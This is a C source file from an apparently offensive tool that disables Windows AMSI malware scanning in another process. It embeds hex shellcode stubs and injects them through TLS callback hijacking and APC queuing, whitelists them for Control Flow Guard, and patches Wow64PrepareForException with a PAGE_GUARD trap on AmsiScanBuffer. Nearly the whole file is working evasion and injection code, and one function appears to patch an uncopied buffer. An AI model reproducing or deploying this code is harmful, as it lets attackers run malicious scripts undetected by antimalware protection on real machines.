#include "AMSIBypass.h"

// These are generated via xxd from the .bin files
unsigned char veh_bin[] = {
  0x4c, 0x8b, 0x41, 0x08, 0x4c, 0x8b, 0x09, 0x41, 0x8b, 0x01, 0x3d, 0x03,
  0x00, 0x00, 0x80, 0x74, 0x0a, 0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x5b,
  0x31, 0xc0, 0xc3, 0x41, 0x50, 0x48, 0x83, 0xec, 0x28, 0x48, 0xb8, 0xcc,
  0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x8d, 0x0d, 0xfc, 0x00,
  0x00, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x41, 0x58, 0x4c, 0x8d,
  0x15, 0xc7, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x12, 0x4d, 0x89, 0x50, 0x48,
  0x49, 0xc7, 0x40, 0x70, 0x01, 0x01, 0x00, 0x00, 0x49, 0xc7, 0x40, 0x68,
  0x00, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x40, 0x30, 0x0d, 0x10, 0x00, 0x10,
  0x00, 0x41, 0x89, 0x40, 0x30, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00, 0x00,
  0x01, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x49, 0x8b, 0x40, 0x68, 0x48,
  0xa9, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x84, 0x7d, 0x00, 0x00, 0x00, 0x49,
  0xc7, 0x40, 0x68, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x98, 0xf8, 0x00,
  0x00, 0x00, 0x4c, 0x8d, 0x15, 0x6f, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x12,
  0x4d, 0x39, 0xd3, 0x75, 0x5f, 0x41, 0x50, 0x48, 0x83, 0xec, 0x20, 0x41,
  0x51, 0x48, 0xb8, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0x48,
  0x8d, 0x0d, 0x56, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x41, 0x59, 0x48, 0x83,
  0xc4, 0x20, 0x41, 0x58, 0x4d, 0x8b, 0x98, 0x98, 0x00, 0x00, 0x00, 0x4d,
  0x8b, 0x53, 0x30, 0x4d, 0x85, 0xd2, 0x74, 0x07, 0x41, 0xc7, 0x02, 0x00,
  0x00, 0x00, 0x00, 0x49, 0xc7, 0x40, 0x78, 0x00, 0x00, 0x00, 0x00, 0x4d,
  0x8b, 0x13, 0x4d, 0x89, 0x90, 0xf8, 0x00, 0x00, 0x00, 0x49, 0x83, 0x80,
  0x98, 0x00, 0x00, 0x00, 0x08, 0x41, 0x83, 0x48, 0x30, 0x10, 0xb8, 0xff,
  0xff, 0xff, 0xff, 0xc3, 0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0x56, 0x45, 0x48, 0x20,
  0x48, 0x69, 0x74, 0x20, 0x21, 0x20, 0x28, 0x41, 0x70, 0x70, 0x6c, 0x79,
  0x20, 0x41, 0x4d, 0x53, 0x49, 0x20, 0x42, 0x79, 0x70, 0x61, 0x73, 0x73,
  0x29, 0x00, 0x56, 0x45, 0x48, 0x20, 0x48, 0x69, 0x74, 0x20, 0x21, 0x20,
  0x28, 0x41, 0x70, 0x70, 0x6c, 0x79, 0x20, 0x48, 0x57, 0x42, 0x50, 0x20,
  0x6f, 0x6e, 0x20, 0x41, 0x4d, 0x53, 0x49, 0x29, 0x00
};
unsigned int veh_bin_len = 333;

unsigned char apc_bin[] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0xb8, 0x37, 0x13,
  0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x48, 0x8d, 0x0d, 0x40, 0x00, 0x00,
  0x00, 0xff, 0xd0, 0x48, 0xb8, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
  0xaa, 0x48, 0x8d, 0x0d, 0x24, 0x00, 0x00, 0x00, 0xff, 0xd0, 0xb9, 0x01,
  0x00, 0x00, 0x00, 0x48, 0xba, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd,
  0xdd, 0x48, 0xb8, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xff,
  0xd0, 0xcc, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0x61, 0x6d, 0x73, 0x69,
  0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x41, 0x50, 0x43, 0x20, 0x73, 0x74, 0x75,
  0x62, 0x20, 0x48, 0x49, 0x54, 0x20, 0x28, 0x72, 0x65, 0x67, 0x69, 0x73,
  0x74, 0x65, 0x72, 0x20, 0x56, 0x45, 0x48, 0x29, 0x00
};
unsigned int apc_bin_len = 117;

unsigned char TLSCallback_bin[] = {
  0x83, 0xfa, 0x01, 0x74, 0x06, 0x83, 0xfa, 0x02, 0x74, 0x01, 0xc3, 0x55,
  0x48, 0x89, 0xe5, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0x48,
  0xb8, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x48, 0x8d, 0x0d,
  0x08, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xcc, 0xc3,
  0x54, 0x4c, 0x53, 0x20, 0x43, 0x41, 0x4c, 0x4c, 0x42, 0x41, 0x43, 0x4b,
  0x20, 0x48, 0x49, 0x54, 0x00
};
unsigned int TLSCallback_bin_len = 65;

PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR* local_tls_bin, SIZE_T local_tls_bin_len) {
    printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
    // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
    // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)
    PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, local_tls_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteTLSCallback) return FALSE;
    WriteToTargetProcess(hProcess, pRemoteTLSCallback, local_tls_bin, local_tls_bin_len);

    printf("[*] TLS callback shellcode written to remote process at 0x%p\n", pRemoteTLSCallback);
    
    DWORD oldTlsProtect;
    if (!WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, local_tls_bin_len, PAGE_EXECUTE_READ, &oldTlsProtect)) {
        printf("[-] Failed to protect TLS callback memory.\n");
        return FALSE;
    }

    printf("[*] TLS callback memory protection set to PAGE_EXECUTE_READ\n");

    //We Get the remote TLS directory
    IMAGE_DOS_HEADER dosHdr = {0};
    if (!ReadFromTargetProcess(hProcess, ImageBase, &dosHdr, sizeof(IMAGE_DOS_HEADER))) {
        printf("[-] Failed to read DOS Header at %p\n", ImageBase);
        return FALSE;
    }

    PVOID pRemoteNtHdr = (PBYTE)ImageBase + dosHdr.e_lfanew;
    IMAGE_NT_HEADERS64 ntHdr = {0};
    if (!ReadFromTargetProcess(hProcess, pRemoteNtHdr, &ntHdr, sizeof(IMAGE_NT_HEADERS64))) {
        printf("[-] Failed to read NT Headers at %p\n", pRemoteNtHdr);
        return FALSE;
    }

    //printf("[*] Remote ImageBase: 0x%p\n", ImageBase);

    DWORD tlsRva = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRva == 0) {
        printf("[-] Target process has no TLS directory. TLS Hijacking aborted.\n");
        return FALSE; // Si pas de TLS, il faut utiliser Early Bird APC
    }
    //printf("[*] Remote TLS Directory RVA: 0x%X\n", ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

    PVOID pRemoteTlsDir = (PBYTE)ImageBase + tlsRva;
    IMAGE_TLS_DIRECTORY64 tlsDir = {0};
    if (!ReadFromTargetProcess(hProcess, pRemoteTlsDir, &tlsDir, sizeof(IMAGE_TLS_DIRECTORY64))) return FALSE;

    //printf("[*] Remote TLS Directory read successfully.\n");
    
    PVOID pRemoteCallbacksArray = (PVOID)tlsDir.AddressOfCallBacks; // Is VA not RVA
    INT callbackCount = 0;
    PVOID tempPtr = NULL;
    //printf("[*] Remote TLS Callbacks Array Address: 0x%p\n", pRemoteCallbacksArray);
    printf("[*] Scanning existing TLS callbacks...\n");
    
    // Check if the array pointer is valid before iterating
    if (pRemoteCallbacksArray != NULL) {
        while (TRUE) {
            // Read the table until we find a NULL entry
            if (!ReadFromTargetProcess(hProcess, (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), &tempPtr, sizeof(PVOID))) 
            {
                printf("[-] Failed to read TLS callback pointer at index %d.\n", callbackCount);
                return FALSE; // Erreur de lecture
            }
            
            if (tempPtr == NULL) break;
            callbackCount++;
        }
    }

    printf("[*] Found %d existing TLS callback(s).\n", callbackCount);

    SIZE_T newArraySize = (callbackCount + 2) * sizeof(PVOID); // +1 for our callback, +1 for the new NULL terminator
    PVOID* localNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newArraySize);
    
    //Copy existing Callback Arrays
    if (callbackCount > 0) {
        ReadFromTargetProcess(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID));
    }
    //Add our callback at the end of the array
    localNewArray[callbackCount] = (PBYTE) pRemoteTLSCallback; // Our callback
    localNewArray[callbackCount + 1] = NULL; // New NULL terminator

    PVOID pRemoteNewArray = WrapperVirtualAllocEx(hProcess, NULL, newArraySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteNewArray) {
        HeapFree(GetProcessHeap(), 0, localNewArray);
        return FALSE;
    }
    WriteToTargetProcess(hProcess, pRemoteNewArray, localNewArray, newArraySize);
    HeapFree(GetProcessHeap(), 0, localNewArray);

    DWORD oldProtectArray;
    WrapperVirtualProtectEx(hProcess, pRemoteNewArray, newArraySize, PAGE_READONLY, &oldProtectArray);

    PVOID pRemoteAddressOfCallBacksField = (PBYTE)pRemoteTlsDir + offsetof(IMAGE_TLS_DIRECTORY64, AddressOfCallBacks);

    DWORD oldProtectHeader;
    if (!WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), PAGE_READWRITE, &oldProtectHeader)) {
        printf("[-] Failed to unprotect PE header.\n");
        return FALSE;
    }

    WriteToTargetProcess(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID));

    WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);

    printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");
    //printf("[*] Breakpoint target: AddressOfCallBacks field is at 0x%p\n", pRemoteAddressOfCallBacksField);
    //printf("[*] Value written: 0x%p\n", pRemoteNewArray);

    return pRemoteTLSCallback;
}

// Helper function to scan the shellcode array and patch 8-byte placeholders
BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, PVOID value) {
    for (SIZE_T i = 0; i <= payloadSize - sizeof(ULONG64); i++) {
        if (*(ULONG64*)(&payload[i]) == placeholder) {
            *(PVOID*)(&payload[i]) = value;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    // 1. Resolve addresses locally.
    HMODULE hKernel32 = CustomGetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    
    // Fallback if amsi.dll is not loaded in our process yet
    HMODULE hAmsi = CustomGetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll"); 

    PVOID pLoadLibraryA = (PVOID)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    PVOID pRtlAddVeh = (PVOID)CustomGetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
    PVOID pAmsiScanBuffer = (PVOID)CustomGetProcAddress(hAmsi, "AmsiScanBuffer");

    printf("[*] Resolved AmsiScanBuffer address: 0x%p\n", pAmsiScanBuffer);


    if (!pLoadLibraryA || !pRtlAddVeh || !pAmsiScanBuffer) {
        printf("[-] Failed to resolve local API addresses.\n");
        return FALSE;
    }

    // --- HEAP ALLOCATION (CRT-Free) ---
    // We duplicate the stubs to the heap to avoid modifying the .rdata section if the stubs vars are put in the .rdata section
    HANDLE hHeap = GetProcessHeap();
    UCHAR* local_veh_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, veh_bin_len);
    UCHAR* local_apc_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, apc_bin_len);
    UCHAR* local_tls_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TLSCallback_bin_len);

    if (!local_veh_bin || !local_apc_bin || !local_tls_bin) {
        if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
        if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
        if (local_tls_bin) HeapFree(hHeap, 0, local_tls_bin);
        return FALSE;
    }

    // CRT-Free memcpy alternative
    for (SIZE_T i = 0; i < veh_bin_len; i++) local_veh_bin[i] = veh_bin[i];
    for (SIZE_T i = 0; i < apc_bin_len; i++) local_apc_bin[i] = apc_bin[i];
    for (SIZE_T i = 0; i < TLSCallback_bin_len; i++) local_tls_bin[i] = TLSCallback_bin[i];

    PVOID pOutputDebugStringA = CustomGetProcAddress(CustomGetModuleHandleW(L"kernel32.dll"), "OutputDebugStringA");

    // 2. Patch VEH Stub Placeholder (Using the Heap copy)
    if (!PatchPlaceholder(local_veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
        HeapFree(hHeap, 0, local_veh_bin);
        HeapFree(hHeap, 0, local_apc_bin);
        HeapFree(hHeap, 0, local_tls_bin);
        return FALSE;
    }
    PatchPlaceholder(local_veh_bin, veh_bin_len, 0xBBBBBBBBBBBBBBBB, pOutputDebugStringA); 
    PatchPlaceholder(local_veh_bin, veh_bin_len, 0xCCCCCCCCCCCCCCCC, pOutputDebugStringA); 

    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC hehe)
    PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteVeh) goto cleanup; // Goto used for clean heap freeing

    if (!WriteToTargetProcess(hProcess, pRemoteVeh, local_veh_bin, veh_bin_len)) {
        printf("[-] Failed to write VEH stub to target process.\n");
        goto cleanup;
    }

    DWORD oldProtect;
    if (!WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to change VEH stub protection.\n");
        goto cleanup;
    }

    // 4. Patch APC Stub Placeholders (Using the Heap copy)
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xAAAAAAAAAAAAAAAA, pLoadLibraryA);
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRemoteVeh);
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xEEEEEEEEEEEEEEEE, pRtlAddVeh);

    PatchPlaceholder(local_tls_bin, TLSCallback_bin_len, 0x1337133713371337, pOutputDebugStringA);
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0x1337133713371337, pOutputDebugStringA);
    
    // 5. Allocate and write APC Stub
    PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteApc) goto cleanup;

    if (!WriteToTargetProcess(hProcess, pRemoteApc, local_apc_bin, apc_bin_len)) {
        printf("[-] Failed to write APC stub to target process.\n");
        goto cleanup;
    }

    if (!WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to change APC stub protection.\n");
        goto cleanup;
    }

    printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
    printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);

    printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");

    PVOID pRemoteTLSCallbackStub = ApplyTLSHijacking(hProcess, hThread, ImageBase, local_tls_bin, TLSCallback_bin_len);

    // --- CFG WHITELISTING ---
    printf("[*] Whitelisting the APC stub, TLS Callback & VEH for CFG\n");
    typedef BOOL (WINAPI * SetProcessValidCallTargets_t)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);
    SetProcessValidCallTargets_t pSetProcessValidCallTargets = (SetProcessValidCallTargets_t)CustomGetProcAddress(CustomGetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");

    if (pSetProcessValidCallTargets) {
        CFG_CALL_TARGET_INFO cfgInfo = {0};
        cfgInfo.Offset = 0; 
        cfgInfo.Flags = CFG_CALL_TARGET_VALID; // Mandatory flag

        // CFG RegionSize MUST be aligned to the system page boundary (4096 bytes). 
        // Passing sizes like 43 or 57 will cause SetProcessValidCallTargets to return ERROR_INVALID_PARAMETER.
        SIZE_T tlsRegionSize = (TLSCallback_bin_len + 0xFFF) & ~0xFFF;
        SIZE_T apcRegionSize = (apc_bin_len + 0xFFF) & ~0xFFF;
        SIZE_T vehRegionSize = (veh_bin_len + 0xFFF) & ~0xFFF;

        if (!pSetProcessValidCallTargets(hProcess, (PBYTE)pRemoteTLSCallbackStub, tlsRegionSize, 1, &cfgInfo)) {
            printf("[-] Failed to whitelist TLS Callback stub for CFG.\n");
            goto cleanup;
        }
        if (!pSetProcessValidCallTargets(hProcess, pRemoteApc, apcRegionSize, 1, &cfgInfo)) {
            printf("[-] Failed to whitelist APC stub for CFG.\n");
            goto cleanup;
        }
        if (!pSetProcessValidCallTargets(hProcess, pRemoteVeh, vehRegionSize, 1, &cfgInfo)) {
            printf("[-] Failed to whitelist VEH stub for CFG.\n");
            goto cleanup;
        }
    }

    // 6. Queue the APC to the target thread
    if (!WrapperQueueUserAPC((PAPCFUNC)pRemoteApc, hThread, 0)) {
        printf("[-] Failed to queue APC.\n");
        goto cleanup;
    }

    printf("[+] APC queued successfully.\n");

    // Clean execution flow ends here, free memory and return TRUE
    HeapFree(hHeap, 0, local_veh_bin);
    HeapFree(hHeap, 0, local_apc_bin);
    HeapFree(hHeap, 0, local_tls_bin);
    return TRUE;

cleanup:
    printf("[-] An error occurred during the VEH bypass setup. Cleaning up... Code : 0x%08X\n", GetLastError());
    // Error execution flow ends here
    if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
    if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
    if (local_tls_bin) HeapFree(hHeap, 0, local_tls_bin); // FIX: Memory leak resolved
    return FALSE;
}

unsigned char CustomHandler_bin[] = {
  0x65, 0x4c, 0x8b, 0x24, 0x25, 0x48, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x2d,
  0xa0, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x6d, 0x00, 0x4d, 0x39, 0xec, 0x0f,
  0x85, 0x87, 0x00, 0x00, 0x00, 0x8b, 0x01, 0x3d, 0x01, 0x00, 0x00, 0x80,
  0x75, 0x7e, 0x4c, 0x8b, 0x82, 0xf8, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x0d,
  0x84, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x09, 0x4d, 0x39, 0xc8, 0x75, 0x68,
  0x4c, 0x8b, 0x9a, 0x98, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x53, 0x30, 0x4d,
  0x85, 0xd2, 0x74, 0x07, 0x41, 0xc7, 0x02, 0x00, 0x00, 0x00, 0x00, 0x48,
  0xc7, 0x42, 0x78, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4c, 0x89,
  0x92, 0xf8, 0x00, 0x00, 0x00, 0x48, 0x83, 0x82, 0x98, 0x00, 0x00, 0x00,
  0x08, 0x52, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83,
  0xec, 0x20, 0x48, 0xb8, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13,
  0x48, 0x8d, 0x0d, 0x3d, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xec,
  0x5d, 0x5a, 0x48, 0x89, 0xd1, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x05, 0x21,
  0x00, 0x00, 0x00, 0x48, 0x8b, 0x00, 0xff, 0xe0, 0xc3, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x11, 0x11, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
  0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x50, 0x61, 0x74, 0x63,
  0x68, 0x65, 0x64, 0x20, 0x00
};
unsigned int CustomHandler_bin_len = 209;


/*
When execption occur, thread is suspended and KiUserExceptionDispatcher is called !
- the functin prepare the strcuts CONTEXT and EXCEPTION_RECORD
- Reads the PTR Wow64PrepareForException from the TEB (gs:[0xC0])
- If not NULL : the function calls the address in Wow64PrepareForException with the CONTEXT and EXCEPTION_RECORD as parameters
    - If the Funtion returns TRUE (or NtContinue) the exception is consiodered handled
- If NULL : The function calls ntdll!RtlDispatchException that parses the VEH lists & SEH lists and calls the handlers
- If no VEH handler handles the exception, the process is terminated

So the bypass consist in patching Wow64PrepareForException with our handler + setting a PAGE_GUARD on AmsiScanBuffer, 
so when AMSI triggers an exception, our handler is called first and can bypassteh AMSIScanBuffer Check 

*/

BOOL ApplyStealthExceptionBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    HMODULE hAmsi = CustomGetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll"); 

    PVOID pAmsiScanBuffer = (PVOID)CustomGetProcAddress(hAmsi, "AmsiScanBuffer");
    PVOID pWow64PrepareForException = (PVOID)CustomGetProcAddress(hNtdll, "Wow64PrepareForException");
    PVOID pNtContinue = (PVOID)CustomGetProcAddress(hNtdll, "NtContinue");

    if (!pAmsiScanBuffer || !pWow64PrepareForException || !pNtContinue) return FALSE;

    // Récupération dynamique du TID cible
    ULONG64 targetTid = (ULONG64)GetThreadId(hThread);

    // Patch des variables dans le shellcode généré
    HANDLE hHeap = GetProcessHeap();
    UCHAR* local_CustomHandler_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, CustomHandler_bin_len);

    PatchPlaceholder(local_CustomHandler_bin, CustomHandler_bin_len, 0x1111111111111111, (PVOID)targetTid);
    PatchPlaceholder(local_CustomHandler_bin, CustomHandler_bin_len, 0x2222222222222222, pAmsiScanBuffer);
    PatchPlaceholder(local_CustomHandler_bin, CustomHandler_bin_len, 0x3333333333333333, pNtContinue);

    // Allocation et écriture du Handler
    PVOID pRemoteHandler = WrapperVirtualAllocEx(hProcess, NULL, CustomHandler_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteToTargetProcess(hProcess, pRemoteHandler, local_CustomHandler_bin, CustomHandler_bin_len);

    // Application du Control Flow Guard (Bitmap Whitelisting)
    SetProcessValidCallTargets_t pSetProcessValidCallTargets = (SetProcessValidCallTargets_t)CustomGetProcAddress(CustomGetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");
    if (pSetProcessValidCallTargets) {
        CFG_CALL_TARGET_INFO cfgInfo = {0};
        cfgInfo.Offset = 0; // L'alignement mémoire valide la cible à l'offset 0
        cfgInfo.Flags = CFG_CALL_TARGET_VALID;
        
        SIZE_T regionSize = (CustomHandler_bin_len + 0xFFF) & ~0xFFF;
        pSetProcessValidCallTargets(hProcess, pRemoteHandler, regionSize, 1, &cfgInfo);
    }

    DWORD oldProtect;
    WrapperVirtualProtectEx(hProcess, pRemoteHandler, CustomHandler_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    // Patch du pointeur global KeDispatchException
    if (!WriteToTargetProcess(hProcess, pWow64PrepareForException, &pRemoteHandler, sizeof(PVOID))) {
        printf("[-] Failed to patch Wow64PrepareForException.\n");
        return FALSE;
    }

    // Application du PAGE_GUARD (déclencheur)
    if (WrapperVirtualProtectEx(hProcess, pAmsiScanBuffer, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect)) {
        printf("[+] Stealth Exception Bypass applied successfully! PAGE_GUARD set on AmsiScanBuffer.\n");
    } else {
        printf("[-] Failed to set PAGE_GUARD on AmsiScanBuffer.\n");
    }

    return TRUE;
}